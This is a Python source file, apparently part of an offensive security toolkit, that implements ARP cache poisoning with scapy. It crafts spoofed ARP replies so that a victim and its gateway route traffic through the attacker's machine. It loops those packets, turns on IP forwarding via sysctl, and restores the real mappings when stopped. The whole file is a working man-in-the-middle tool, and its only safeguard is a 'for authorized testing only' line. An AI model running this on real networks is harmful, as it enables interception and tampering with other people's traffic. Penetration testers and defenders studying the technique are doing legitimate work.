"""ARP cache poisoning — put us on-path on a shared segment.

Sends gratuitous ARP replies so the victim believes the gateway's IP is at our
MAC (and the gateway believes the victim's IP is at our MAC), routing their
traffic through us. Restores the real mappings on stop. Enable IP forwarding so
the victim keeps connectivity while we observe/manipulate.

Packet crafting is separated from the send loop so it is unit-testable without
root. For authorized testing only.
"""

from __future__ import annotations

import logging
import threading
import time

log = logging.getLogger("reforge.arp")


def poison_packet(target_ip: str, target_mac: str, spoof_ip: str, our_mac: str):
    """ARP reply telling `target_ip` that `spoof_ip` is at `our_mac`."""
    from scapy.layers.l2 import ARP, Ether

    return (Ether(dst=target_mac, src=our_mac)
            / ARP(op=2, psrc=spoof_ip, hwsrc=our_mac, pdst=target_ip, hwdst=target_mac))


def restore_packet(target_ip: str, target_mac: str, real_ip: str, real_mac: str):
    """ARP reply restoring the true `real_ip -> real_mac` mapping for target."""
    from scapy.layers.l2 import ARP, Ether

    return (Ether(dst=target_mac, src=real_mac)
            / ARP(op=2, psrc=real_ip, hwsrc=real_mac, pdst=target_ip, hwdst=target_mac))


class ArpSpoofer:
    def __init__(self, iface: str, victim_ip: str, gateway_ip: str, interval: float = 2.0):
        self.iface = iface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.interval = interval
        self.our_mac = None
        self.victim_mac = None
        self.gateway_mac = None
        self._thread: threading.Thread | None = None
        self._running = threading.Event()
        self.sent = 0

    def resolve(self, ip: str) -> str | None:  # pragma: no cover (needs network)
        from scapy.layers.l2 import getmacbyip

        return getmacbyip(ip)

    def _our_mac(self) -> str:  # pragma: no cover
        from scapy.all import get_if_hwaddr

        return get_if_hwaddr(self.iface)

    def start(self) -> bool:  # pragma: no cover (needs root + network)
        self.our_mac = self._our_mac()
        self.victim_mac = self.resolve(self.victim_ip)
        self.gateway_mac = self.resolve(self.gateway_ip)
        if not (self.victim_mac and self.gateway_mac):
            log.error("could not resolve victim/gateway MAC")
            return False
        enable_ip_forward(True)
        self._running.set()
        self._thread = threading.Thread(target=self._loop, name="reforge-arp", daemon=True)
        self._thread.start()
        log.info("ARP spoof: %s <-> %s via %s", self.victim_ip, self.gateway_ip, self.our_mac)
        return True

    def _loop(self) -> None:  # pragma: no cover
        from scapy.sendrecv import sendp

        while self._running.is_set():
            sendp(poison_packet(self.victim_ip, self.victim_mac, self.gateway_ip, self.our_mac),
                  iface=self.iface, verbose=False)
            sendp(poison_packet(self.gateway_ip, self.gateway_mac, self.victim_ip, self.our_mac),
                  iface=self.iface, verbose=False)
            self.sent += 2
            time.sleep(self.interval)

    def stop(self) -> None:  # pragma: no cover
        self._running.clear()
        if self._thread:
            self._thread.join(timeout=2.0)
        self.restore()

    def restore(self) -> None:  # pragma: no cover
        from scapy.sendrecv import sendp

        if self.victim_mac and self.gateway_mac:
            for _ in range(3):
                sendp(restore_packet(self.victim_ip, self.victim_mac,
                                     self.gateway_ip, self.gateway_mac),
                      iface=self.iface, verbose=False)
                sendp(restore_packet(self.gateway_ip, self.gateway_mac,
                                     self.victim_ip, self.victim_mac),
                      iface=self.iface, verbose=False)
        enable_ip_forward(False)


def enable_ip_forward(on: bool) -> list[str]:  # pragma: no cover
    import subprocess

    cmd = ["sysctl", "-w", f"net.ipv4.ip_forward={1 if on else 0}"]
    try:
        subprocess.run(cmd, capture_output=True, check=False)
    except Exception:
        pass
    return cmd
